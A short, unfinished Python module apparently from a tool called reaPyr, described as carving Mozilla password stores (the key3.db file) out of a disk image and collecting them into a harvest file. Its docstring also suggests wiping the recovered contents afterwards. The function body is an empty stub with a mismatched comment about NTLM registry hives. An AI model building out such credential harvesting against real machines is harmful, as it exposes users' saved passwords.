"""

	Mozilla Reaper

	This script makes use of the disk handed to us by reaPyr and
	attempts to carve out any Mozilla passwords on disk.  Currently
	does nothing more than carve out the key3.db file and write it
	out to the disk_rec folder.

	Food for thought:

	* Delete the disk_rec contents when completed
	* copy hrvst file somewhere more centraly/aggregate
	them

"""
import sys

def reap(d):
	# Registry hives containing NTLM password hashes.
	fout = open("./mozilla/ff_hrvst.txt",'a')

	key_db = ""

